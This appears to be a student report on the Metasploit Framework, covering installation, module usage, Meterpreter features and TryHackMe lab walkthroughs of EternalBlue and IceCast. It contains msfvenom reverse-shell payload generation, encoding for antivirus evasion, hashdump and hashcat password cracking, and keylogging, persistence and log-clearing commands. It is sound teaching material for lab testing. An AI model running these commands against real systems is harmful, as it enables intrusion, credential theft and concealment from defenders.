# 1. Introduction
The Metasploit Framework is a vital tool in cybersecurity, used for penetration testing and vulnerability assessment. Developed by H.D. Moore in 2003 and now maintained by Rapid7, it has evolved from simple scripts into a comprehensive platform essential for security professionals. Metasploit helps identify and remediate security weaknesses by simulating real-world attacks, allowing organizations to enhance their defenses. Its vibrant community continuously updates the framework to address the latest security challenges. Extensively used in academic settings, Metasploit provides hands-on experience in security testing, making it an invaluable educational resource. Governed by strict ethical guidelines, Metasploit must be used only for authorized security assessments to ensure legal compliance and maintain the integrity of security practices. Thus, the Metasploit Framework stands as a cornerstone of modern cybersecurity, crucial for both current and future security professionals.

# Problem Statement:

In the realm of cybersecurity, ethical hackers and penetration testers face several challenges when attempting to assess the security posture of systems and networks:

### Challenges Faced Without Metasploit:
1. **Tool Proliferation:**
   - Ethical hackers need to install, configure, and manage a multitude of separate tools for various phases of penetration testing. This includes vulnerability scanners, exploit tools, payload generators, encoders, and more. Managing these tools can be time-consuming and complex.

2. **Integration Issues:**
   - Different tools often have compatibility issues, requiring additional effort to integrate their outputs and functionalities. This lack of seamless integration can lead to inefficiencies and increased chances of errors.

3. **Skill Requirements:**
   - Each tool has its own learning curve and usage complexities. Ethical hackers must be proficient in numerous tools, which demands significant time and effort in training and skill development.

4. **Data Management:**
   - Keeping track of data generated from various tools, such as scan results, exploit attempts, and payload deployments, can be cumbersome. Organizing and correlating this data manually increases the risk of missing critical insights.
# 2. Installation

### 2.1 Unix / macOS:

#### Automatic Installation (Linux / macOS):
To automatically install Metasploit on Linux or macOS systems, use the following script invocation:
- Run the command:
  ```bash
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
  ```
  Once installed, you can launch msfconsole as /opt/metasploit-framework/bin/msfconsole from a terminal window, or depending on your environment, it may already be in your path and you can just run it directly. On the first run, a series of prompts will help you set up a database and add Metasploit to your local PATH if it is not already.

#### Manual Installation for Linux:
- Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com.

#### Manual Installation for macOS:
- The latest macOS installer package can be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 8 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metasploit Framework with all of its dependencies.

### 2.2 Windows:

#### Manual Installation:
- Download the latest Windows installer or view older builds here: https://windows.metasploit.com/. To install, download the .msi package, adjust your Antivirus as-needed to ignore c:\metasploit-framework, and execute the installer by right-clicking the installer file and selecting “Run as Administrator”. The msfconsole command and all related tools will be added to the system %PATH% environment variable.

#### Silent Installation (PowerShell):
The following PowerShell script will download and install the framework, suitable for automated Windows deployments:

```powershell
[CmdletBinding()]
Param(
    $DownloadURL = "https://windows.metasploit.com/metasploitframework-latest.msi",
    $DownloadLocation = "$env:APPDATA/Metasploit",
    $InstallLocation = "C:\Tools",
    $LogLocation = "$DownloadLocation/install.log"
)

If(! (Test-Path $DownloadLocation) ){
    New-Item -Path $DownloadLocation -ItemType Directory
}

If(! (Test-Path $InstallLocation) ){
    New-Item -Path $InstallLocation -ItemType Directory
}

$Installer = "$DownloadLocation/metasploit.msi"

Invoke-WebRequest -UseBasicParsing -Uri $DownloadURL -OutFile $Installer

& $Installer /q /log $LogLocation INSTALLLOCATION="$InstallLocation"
```
### 2.3 Supported Operating Systems & Requirements:

- **Unix-based systems (Linux, macOS)**
  - **Operating System:** 
    - Linux distributions (e.g., Debian, Ubuntu, CentOS, Red Hat) or macOS.
  - **Processor:** 
    - x86 or x86_64 compatible processor.
  - **Memory:** 
    - At least 1 GB RAM.
  - **Storage:** 
    - Minimum of 200 MB disk space for installation.
  - **Additional Requirements:** 
    - Internet access for automatic updates and package downloads.

- **Windows (7, 8, 10, and newer)**
  - **Operating System:** 
    - Windows 7, 8, 10, or newer.
  - **Processor:** 
    - Intel Pentium 4 processor or later that's SSE2 capable.
  - **Memory:** 
    - At least 1 GB RAM.
  - **Storage:** 
    - Minimum of 1 GB disk space for installation.
  - **Additional Requirements:** 
    - Internet access for automatic updates and package downloads. Windows Installer 3.1 or later.
### 2.4 Installing Updates:
- Unix Systems:
  ```bash
  sudo apt-get update
  sudo apt-get upgrade metasploit-framework
  ```
- Windows Systems:
  - Open command prompt in Metasploit installation directory.
  - Run: `msfupdate`
 
# 3. Interfaces:

Metasploit provides various interfaces for interacting with its framework, catering to different user preferences and requirements:

- **Console Interface:** 
  The console interface, often referred to as the Metasploit Console or `msfconsole`, is a command-line interface (CLI) that provides comprehensive access to the Metasploit Framework. It allows users to execute various commands, launch exploits, perform post-exploitation tasks, and manage sessions. For example, typing `msfconsole` in the terminal will launch the console interface.

- **GUI Interface:** 
  Metasploit also offers a graphical user interface (GUI) for users who prefer a visual representation of the framework's capabilities. The GUI interface provides a more user-friendly environment for performing tasks such as selecting and launching exploits, analyzing vulnerabilities, and managing workspace projects. For example, **Armitage** is a popular GUI interface for Metasploit.

- **Command Line Interface (CLI):** 
  The command-line interface (CLI) in Metasploit allows users to execute specific commands and scripts without launching the full console environment. While `msfcli` is no longer supported, users can still utilize other command-line tools such as `msfvenom` for generating payloads or `msfconsole` for executing commands and scripts directly from the terminal.

- **Web Interface:** 
  Metasploit includes a web interface that enables users to interact with the framework through a web browser. The web interface provides a user-friendly dashboard for managing exploits, payloads, listeners, and sessions, as well as accessing reporting and collaboration features. It offers a convenient way to perform security assessments and monitor ongoing activities remotely. For example, accessing `https://localhost:3790` in a web browser will open the Metasploit web interface.

# 4. Using the Framework

### 4.1 Choosing a Module
Choosing the appropriate module in Metasploit is the first step in conducting a successful penetration test or vulnerability assessment. Metasploit categorizes its modules into six main types: exploits, auxiliary, payloads, encoders, nops, and post. Each module serves a specific purpose, whether it's exploiting a vulnerability, performing a network scan, delivering a payload, obfuscating code, or generating a NOP sled. Selecting the correct module involves understanding the target system, the vulnerabilities it may have, and the specific outcomes desired from the testing.

### 4.2 Exploit Modules

Exploit modules are the core components of Metasploit, designed to exploit specific vulnerabilities in software and systems. They include a variety of exploits that target different operating systems, applications, and services.

**_Options_** are parameters dictating module behavior. Use `show options` to view and configure them. Tailoring options maximizes exploitation success.

**Host:** 
   - Example: `set RHOSTS 192.168.1.100`
   - Description: Specifies the IP address or hostname of the target system.

**Port:** 
   - Example: `set RPORT 445`
   - Description: Specifies the network port number on the target system.

**Payload:** 
   - Example: `set PAYLOAD windows/meterpreter/reverse_tcp`
   - Description: Specifies the type of payload that the module will deliver to the target system once the exploit is successful.

**Target:** 
   - Example: `set TARGET 7`
   - Description: Specifies the specific target configuration or version.

**RHOSTS:** 
   - Example: `set RHOSTS 192.168.1.0/24`
   - Description: Specifies one or more target IP addresses or hostnames.

**LHOST:** 
   - Example: `set LHOST 10.0.0.1`
   - Description: Specifies the IP address or hostname of the attacker machine.

**LPORT:** 
   - Example: `set LPORT 4444`
   - Description: Specifies the network port number on the attacker machine.

**SSL:** 
   - Example: `set SSL true`
   - Description: Enables SSL/TLS encryption for communication.

**VERBOSE:** 
   - Example: `set VERBOSE true`
   - Description: Increases the verbosity of module output for troubleshooting.

Metasploit offers extensive options, including advanced ones accessed via `show advanced`, requiring expertise for proper utilization and editing.

#### 4.2.1 Searching for an Exploit Module
Searching for an appropriate exploit module can be done using the `search` command within the Metasploit console. This helps to identify available exploits for specific vulnerabilities or software versions.

*Example:*

- `search type:exploit name:ms08_067`

#### 4.2.2 Configuring the Active Exploit
Configuring the active exploit involves setting the necessary parameters that the exploit requires to function correctly. This typically includes the target IP address, port number, and any specific options that the exploit might need.

*Example:*

- `use exploit/windows/smb/ms08_067_netapi`
- `set RHOST 192.168.1.100`

#### 4.2.3 Verifying the Exploit Options
Before launching an exploit, it is crucial to verify all configured options to ensure they are correctly set. This step helps in avoiding misconfigurations that could lead to failed exploitation attempts.

*Example:*

- `show options`

#### 4.2.4 Selecting a Target
Some exploits can target multiple versions or configurations of software. Selecting the appropriate target ensures that the exploit is tailored to the specific vulnerability present in the target system.

*Example:*

- `set TARGET 0`

#### 4.2.5 Selecting the Payload
The payload is the code that runs on the target system once the exploit is successful. Metasploit provides a wide range of payloads, from simple command execution to complex Meterpreter sessions. Choosing the right payload depends on the objectives of the penetration test.
*Example:*

- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.1.101`

#### 4.2.6 Launching the Exploit
Once all configurations are set, launching the exploit initiates the attack. If successful, the payload is delivered, and the tester gains control over the target system or obtains the desired information.

*Example:*

- `exploit`
  
### 4.3 Auxiliary Modules
Auxiliary modules provide additional functionality beyond exploitation. They include tasks like scanning, fuzzing, and administrative functions.

#### 4.3.1 Searching for an Auxiliary Module
Auxiliary modules can be searched similarly to exploit modules, using keywords related to the desired functionality.

*Example:*

- `search type:auxiliary portscan`

#### 4.3.2 Running an Auxiliary Task
Running an auxiliary task involves selecting and configuring an auxiliary module to perform a specific function. This might include network discovery, vulnerability scanning, or service enumeration.

*Example:*

- `use auxiliary/scanner/portscan/tcp`
- `set RHOSTS 192.168.1.0/24`
- `set THREADS 10`
- `run`

### 4.4 Payload Modules
Payload modules are the code executed on the target system after exploitation. They are a crucial part of the post-exploitation phase, enabling further actions on the compromised system.

#### 4.4.1 Searching for a Payload Module
Payloads can be searched based on the type of shell or function desired.

*Example:*

- `search type:payload windows`

#### 4.4.2 Generating a Payload
Generating a payload involves selecting the appropriate payload type and configuring it to work with the chosen exploit. Metasploit provides tools like `msfvenom` to create and customize payloads for various scenarios.

*Example:*

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o /tmp/meterpreter.exe`

### 4.5 Encoder Modules
Encoders are used to obfuscate payloads to evade detection by security mechanisms like antivirus software. They transform the payloads into different formats to avoid signature-based detection.

#### 4.5.1 Searching for an Encoder Module
Encoders can be searched using the `search` command.

*Example:*

- `search type:encoder`

#### 4.5.2 Using an Encoder
Using an encoder involves selecting and configuring the encoder to transform the payload. This process helps in bypassing security controls that detect known payload signatures.

*Example:*

- `use encoder/x86/shikata_ga_nai`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.1.101`
- `generate -f exe -o /tmp/encoded_meterpreter.exe`

### 4.6 NOP Modules
NOP (No Operation) modules are used to generate NOP sleds, sequences of NOP instructions that help align the payload in memory during exploitation. NOP sleds increase the likelihood of successful payload execution in buffer overflow attacks.

#### 4.6.1 Searching for a NOP Module
NOP modules can be searched using the `search` command.

*Example:*

- `search type:nop`

#### 4.6.2 Generating a NOP Sled
Generating a NOP sled is a technique used in buffer overflow exploits to ensure reliable execution of the payload. Metasploit can generate these sleds to prepend to the payload, increasing the chances of successful exploitation.

*Example:*

- `msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe -o /tmp/encoded_meterpreter.exe`

### 4.7 Post Modules
Post-exploitation modules are used after a successful exploit to gather information, maintain access, and pivot to other systems.

#### 4.7.1 Searching for a Post Module
Post modules can be searched using the `search` command.

*Example:*

- `search type:post`

#### 4.7.2 Running a Post Module
Running a post module involves selecting and configuring the module to perform specific post-exploitation tasks, such as

collecting information, dumping credentials, or establishing persistence on the compromised system.

*Example:*

- `use post/windows/gather/enum_logged_on_users`
- `set SESSION 1`
- `run`

### 5. Meterpreter
Meterpreter, an integral component of the Metasploit Framework, serves as a pivotal post-exploitation tool widely utilized by penetration testers and ethical hackers. Its inception within the open-source framework enables security professionals to discover, exploit, and validate vulnerabilities across diverse systems and networks. At its core, Meterpreter facilitates interactive shell sessions on compromised target systems, affording operators comprehensive control over various system facets.

#### 5.1 Key Features and Functionalities:

- **Platform Independence:** Meterpreter boasts platform independence, functioning seamlessly across Windows, Linux, and macOS environments, ensuring compatibility across a spectrum of target systems.
- **Payload Delivery:** Often employed as a payload post-exploit, Meterpreter injects into system memory, evading detection by bypassing disk storage, thus enhancing its stealth capabilities.
- **Remote Shell Access:** Providing an interactive command shell, Meterpreter empowers operators to execute commands on compromised systems remotely, akin to physical presence, facilitated by features like tab completion and command history.
- **File System Manipulation:** Security practitioners leverage Meterpreter to navigate, upload, and download files on target systems, essential for reconnaissance, data exfiltration, and infiltration purposes.
- **Privilege Escalation:** Equipped with built-in post-exploitation modules, Meterpreter facilitates privilege escalation, crucial for transitioning from lower- to higher-privileged user accounts.
- **Port Forwarding:** Meterpreter enables port forwarding, enabling the establishment of secure communication tunnels between attacker and target systems.
- **Keylogging:** Offering keylogging capabilities, Meterpreter captures keystrokes, unveiling potentially sensitive information such as usernames and passwords.
- **Screenshot Capture:** Security professionals utilize Meterpreter to capture screenshots of target system desktops, aiding in the observation of victim activities.
- **Persistence:** Meterpreter establishes persistence on compromised systems, ensuring sustained access even post-system reboots.

#### 5.2 Basic Meterpreter Commands:

- `help`: Lists available Meterpreter commands.
- `sysinfo`: Retrieves system information.
- `pwd`: Displays current working directory.
- `ls` or `dir`: Lists files and directories.
- `cd`: Changes current directory.
- `download`: Downloads files from target to local machine.
- `upload`: Uploads files from local machine to target.
- `shell`: Opens shell session on target.
- `ps`: Lists running processes.
- `kill`: Terminates specified process.
- `getsystem`: Attempts privilege escalation to SYSTEM level (Windows).
- `hashdump`: Dumps password hashes (Windows SAM database).
- `keyscan_start` and `keyscan_dump`: Initiates and dumps keylogging data.
- `screenshot`: Captures target desktop screenshot.

#### 5.3 Advanced Meterpreter Features:

- `migrate`: Moves session to another process for stealth.
- `portfwd`: Sets up port forwarding for traffic pivoting.
- `webcam_list` and `webcam_snap`: Lists and captures webcam images (if available).
- `timestomp`: Manipulates file timestamps for cover-up.
- `clearev`: Clears event logs on target system.

#### 5.4 Persistence and Privilege Escalation:

- `run persistence`: Establishes persistent backdoor for continued access.
- `getuid`: Displays current user's privileges.
- `getprivs`: Shows available privileges.
- `rev2self`: Attempts to revert to original token.
- `use incognito`: Activates incognito mode for token manipulation.

#### 5.5 Cleaning Up:

- `clearev`: Clears event logs on target system.
- `execute -f cmd.exe -i -H`: Spawns new command prompt with high integrity level.

# 6. Case Studies

### 6.1 EternalBlue

In this section, we will explore a real-world scenario involving the complete utilization of Metasploit. For this case study, I used a vulnerable machine obtained from the TryHackMe platform. This machine is vulnerable to EternalBlue (CVE-2017-0143). We will conduct a penetration testing process on this machine using Metasploit to demonstrate its effectiveness in identifying and exploiting vulnerabilities.

This case study aims to provide a comprehensive view of how Metasploit can be applied in practical scenarios, showcasing its capabilities and utility in a controlled, educational environment. By following this example, security professionals can gain insights into the steps and methodologies involved in a typical penetration testing process.

#### 6.1.1 Initial Setup

The initial phase of the penetration process involves network scanning to identify all active IP addresses within our network. This reconnaissance phase is crucial as it provides a foundational understanding of the network's layout and the potential targets available for further assessment and exploitation.

First, let's turn on the database and open the Metasploit Framework using the following command:

```bash
sudo msfdb init && msfconsole
```

#### 6.1.2 Network Discovery

For this step, we need to identify our network IP address with its subnet to perform network scanning. We will use Nmap, a network scanning tool integrated into Metasploit, to discover devices on our network.

Execute the following command with the `-sn` option to scan the network range:

```bash
nmap -sn 10.10.254.0/24
```

The initial scan returned numerous IP addresses, making it impractical to check each one manually. To refine our search, we can add arguments to Nmap to specifically look for IPs with open SMB ports (445 or 139). By using the `-p 445,139` option along with `--open`, we can focus only on the hosts with these ports open.

![Screenshot from 2024-06-27 16-56-21](https://github.com/mchklt/PFE/assets/53612008/4db0c22f-0405-4e0d-a6e6-5e6fbcfe7c9d)


Now, we need to identify only the hosts vulnerable to EternalBlue (CVE-2017-0143). By adding the `--script smb-vuln-ms17-010.nse` option to our Nmap command, we can achieve this. This script specifically checks for the MS17-010 vulnerability, allowing us to pinpoint the vulnerable systems.

![Screenshot from 2024-06-27 17-01-24](https://github.com/mchklt/PFE/assets/53612008/61ae5d38-9039-481d-96ae-bf821ef189ba)

That's it! We have identified `10.10.254.86` as the vulnerable host. Now, in Metasploit, we can search for an exploit targeting this vulnerability using the following command:

```bash
search ms17_010 type:exploit
```

![Screenshot from 2024-06-27 17-03-37](https://github.com/mchklt/PFE/assets/53612008/237cd8e4-f82b-4e52-a85b-509dc87777b7)

#### 6.1.3 Exploitation

Let's move to the first module by using the following command:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

or simply:

```bash
use 0
```

We are now in the module that can exploit the ms17_010 vulnerability on our target host `10.10.254.86`.

![Screenshot from 2024-06-27 17-06-18](https://github.com/mchklt/PFE/assets/53612008/bb690507-b0ed-4094-a6be-2d1ecc231f93)

By typing `show options`, we can view the variables that need to be set for the exploit.

![Screenshot from 2024-06-27 17-08-48](https://github.com/mchklt/PFE/assets/53612008/08e2d4c7-d0cf-4f9f-acc5-c7ea6dfd0913)

The important variables for us are `RHOST`, `RPORT`, `LHOST`, and `LPORT`:

- **RHOST**: This variable specifies the IP address of the target host that we intend to exploit. In our case, it's `10.10.254.86`. To set it, use `set RHOSTS 10.10.254.86`.

- **RPORT**: This variable specifies the port number on the target host where the vulnerable service is running. For the EternalBlue exploit, it's typically `445` (SMB port). To set it, use `set RPORT 445`.

- **LHOST**: This variable specifies the IP address of our attacking machine, where we want to receive the reverse shell or establish communication. It should be set to our own IP address. For example, `set LHOST 10.4.83.48`.

- **LPORT**: This variable specifies the port on our attacking machine that will be used for communication with the vulnerable host. It's chosen by us to receive the reverse shell or other communication. For instance, `set LPORT 9090`.

By typing `exploit`, we initiate the attack against the vulnerable host.

![Screenshot from 2024-06-27 17-22-19](https://github.com/mchklt/PFE/assets/53612008/d9b06a18-f498-4730-9a34-b5104915d27b)

That's it, we've successfully gained access to the vulnerable machine.

![Screenshot from 2024-06-27 18-03-31](https://github.com/mchklt/PFE/assets/53612008/8d8f4f23-f895-4474-ac97-26321b1486fd)

#### 6.1.4 Post-Exploitation

Now, to keep our session running in the background, we'll type `CTRL + Z`, then confirm with `y`.

![Screenshot from 2024-06-27 18-12-05](https://github.com/mchklt/PFE/assets/53612008/d68b03b2-899a-46b4-850d-9e81b646a30d)

Let's switch from the regular shell to Meterpreter to explore further by using `session -u 1`.

![Screenshot from 2024-06-27 18-43-41](https://github.com/mchklt/PFE/assets/53612008/7b3822f7-5611-466c-a1c9-7e48a80b5e15)

Done, now that our Meterpreter session has been added to the sessions, you can view all active sessions by typing `sessions`, and to enter session 2, type `session 2`.

![Screenshot from 2024-06-27 18-45-02](https://github.com/mchklt/PFE/assets/53612008/774c84f6-a788-45d5-940a-6e0085f47a1b)

#### 6.1.5 Privilege Escalation

After executing `hashdump` to dump secret hashes, here are the results:

![Screenshot from 2024-06-27 19-12-02](https://github.com/mchklt/PFE/assets/53612008/e3e13be1-25f3-4b62-a69b-ccfa38455aee)

To crack the hashed password using Hashcat, follow these steps. First, redirect the NTLM hash to a file named `hash.txt`:

```bash
echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash.txt
```

Next, use Hashcat with the specified format and a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`) to crack the hash:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

This command attempts to crack the NTLM hash using words from the `rockyou.txt` wordlist.

![Screenshot from 2024-06-27 19-56-39](https://github.com/mchklt/PFE/assets/53612008/25038958-717c-486e-9d39-ca35b9eb157d)

To display the cracked passwords in plain text using Hashcat, use the following command:

```bash
hashcat --show hash.txt
```

![Screenshot from 2024-06-27 19-56-45](https://github.com/mchklt/PFE/assets/53612008/e5a78e75-55a5-4d3e-a05d-591f7f100bf7)

Now that we have the users' passwords, we can proceed to the next phase of penetration testing: lateral movement.

### 6.2 IceCast

In this section, we will gain access to the target machine using the same strategy as before. The machine's IP is 10.10.59.75, and there is an open port 8000 running a service named IceCast. As a pentester, my first step is to research this service and check for any public exploits or disclosed CVEs.

![Screenshot from 2024-06-28 23-55-50](https://github.com/mchklt/PFE/assets/53612008/6fc423c4-3f84-4025-84a2-76ecdf330b9c)

1. **Finding Public Exploits:**
To find public exploits for the IceCast service using Metasploit, use the following command:
```
search icecast
```

2. **Identifying the Exploit Module:**
After researching IceCast, we discovered a module that exploits an overwrite vulnerability. Upon switching to this module, we found that the required variables were similar to the previous one, asking for `RHOSTS`, `RPORT`, `LHOST`, and `LPORT`.

![Screenshot from 2024-06-28 23-58-19](https://github.com/mchklt/PFE/assets/53612008/3dabbf8c-fa07-49ee-bde8-b6d9d3fd0f4d)

3. **Setting Variables and Exploiting:**
After setting the required variables, let's proceed to exploit it.

![Screenshot from 2024-06-29 00-04-14](https://github.com/mchklt/PFE/assets/53612008/aa9219bd-9d1e-4027-a815-916f5af746c3)

4. **Gaining Meterpreter Session:**
That's it, we got a Meterpreter session. Now, we are in the vulnerable machine and can perform various actions such as retrieving system information by typing `sysinfo`.

![Screenshot from 2024-06-29 00-08-54](https://github.com/mchklt/PFE/assets/53612008/dc654554-6575-4618-90c7-a3b461d918cf)

5. **Taking a Screenshot:**
We can also take a screenshot by typing `screenshot`.

![Screenshot from 2024-06-29 00-06-23](https://github.com/mchklt/PFE/assets/53612008/cb883225-e413-40f2-9d79-d0e0759d66b9)

The screenshot is saved in `/home/mchklt/bNZAwQRG.jpeg`. Here is the screenshot that we got:

![bNZAwQRG](https://github.com/mchklt/PFE/assets/53612008/b8dc7b6f-dd12-4ec4-ba15-fa8980ec7313)


This section demonstrates the effective use of Metasploit for exploiting vulnerabilities, Metasploit is a powerful tool in penetration testing, capable of identifying, exploiting, and validating security weaknesses across various systems and applications. Its versatility allows it to be used in all phases of penetration testing, from information gathering and vulnerability scanning to exploitation and post-exploitation activities. By leveraging Metasploit, security professionals can comprehensively assess the security posture of their targets and identify areas for improvement.

# How Metasploit Solves The Problems:
In response to the challenges highlighted earlier, Metasploit presents a unified approach to cybersecurity testing. By integrating multiple tools into a cohesive framework, it addresses the complexities of installation, integration, and skill requirements that often burden ethical hackers. This streamlined solution not only simplifies the testing process but also enhances data management, ensuring comprehensive insights and efficient workflows.

1. **Unified Platform:**
   - Metasploit consolidates the functionality of multiple tools into a single, cohesive framework. Ethical hackers can perform vulnerability scanning, exploit development, payload generation, and post-exploitation tasks all within Metasploit, reducing the need for separate tools.

2. **Seamless Integration:**
   - Metasploit's modular architecture allows for seamless integration of various components, such as exploits, payloads, and auxiliary modules. This integration streamlines workflows and ensures compatibility, reducing the time and effort needed for setup.

3. **Ease of Use:**
   - With a comprehensive and user-friendly interface, Metasploit simplifies the penetration testing process. The framework provides a consistent command set and options, making it easier for ethical hackers to learn and use effectively.

4. **Efficient Data Management:**
   - Metasploit offers built-in data management capabilities, allowing users to store, organize, and correlate data from different phases of a penetration test. This centralized data repository enhances visibility and aids in comprehensive reporting.

# Metasploit Cheat Sheet

Metasploit offers a robust set of commands and syntax for effective penetration testing and vulnerability exploitation.

**MSFconsole Commands:**

- `show exploits`: Lists all exploits within the Framework.
- `show payloads`: Displays available payloads.
- `show auxiliary`: Shows auxiliary modules.
- `show options`: Reveals module options.
- `show targets`: Displays supported platforms.
- `show advanced`: Accesses advanced options.

**Module Loading and Configuration:**

- `use name`: Loads an exploit or module.
- `set function`: Sets a specific value.
- `setg function`: Sets a specific value globally.
- `set target num`: Specifies a specific target index.
- `set payload payload`: Specifies the payload to use.

**Exploitation and Interaction:**

- `check`: Determines target vulnerability.
- `exploit`: Executes the module or exploit.
- `exploit -j`: Runs the exploit in the background.
- `exploit -z`: Does not interact post-exploitation.

### Meterpreter Commands

Meterpreter provides extensive post-exploitation capabilities:

**Basic Commands:**

- `help`: Opens Meterpreter usage help.
- `sysinfo`: Shows system information.
- `ls`: Lists files and folders.
- `ps`: Displays running processes.

**Privilege Escalation and Token Manipulation:**

- `getsystem`: Attempts SYSTEM-level access.
- `use priv`: Loads privilege extension.
- `list_tokens -u` and `-g`: Lists available tokens.

**File Operations and Keylogging:**

- `upload file`: Uploads a file.
- `download file`: Downloads a file.
- `keyscan_start`: Initiates keylogging.
- `keyscan_dump`: Dumps captured keys.

**System Control and Manipulation:**

- `reboot`: Reboots the target machine.
- `clearev`: Clears event logs.
- `timestomp`: Alters file attributes.

# Conclusion

The Metasploit Framework stands as an indispensable tool in the realm of cybersecurity, offering robust capabilities for penetration testing and vulnerability assessment. Through the comprehensive exploration of its features and functionalities in this report, it becomes evident that Metasploit provides security professionals with a powerful platform for identifying, exploiting, and mitigating security weaknesses.

The installation process, detailed across various operating systems, demonstrates the flexibility and accessibility of Metasploit. Its multiple interfaces, including the command-line interface (CLI), graphical user interface (GUI), and web interface, cater to diverse user preferences, enhancing usability and efficiency in security operations.

The practical application of Metasploit, as showcased in the EternalBlue case study, highlights its effectiveness in real-world scenarios. The step-by-step approach—from initial network discovery to exploitation and post-exploitation—illustrates the framework's capability to simulate real-world attacks, providing invaluable insights into system vulnerabilities.

Furthermore, the extensive range of modules, including exploits, auxiliary tools, payloads, encoders, NOPs, and post-exploitation features, underscores Metasploit's versatility. This adaptability is crucial for conducting thorough security assessments, allowing professionals to tailor their approach based on specific objectives and target environments.

Meterpreter, as an integral part of Metasploit, enhances post-exploitation capabilities, offering advanced features such as privilege escalation, keylogging, and persistence. These functionalities enable deeper penetration and control over compromised systems, facilitating comprehensive security evaluations.

In conclusion, the Metasploit Framework's continual evolution, driven by a vibrant community and maintained by Rapid7, ensures it remains at the forefront of cybersecurity tools. Its practical applications in both academic and professional settings make it an invaluable resource for current and future security professionals. By adhering to strict ethical guidelines and legal compliance, Metasploit reinforces the integrity of security practices, cementing its role as a cornerstone of modern cybersecurity.


# References

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Rapid7 Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [TryHackMe](https://tryhackme.com/)
- [Metasploit Unleashed by Offensive Security](https://www.offsec.com/metasploit-unleashed/)
- [Metasploit: The Penetration Tester's Guide](https://olinux.net/wp-content/uploads/2019/01/Metasploit-The-Penetration-Tester-s-Guide.pdf)
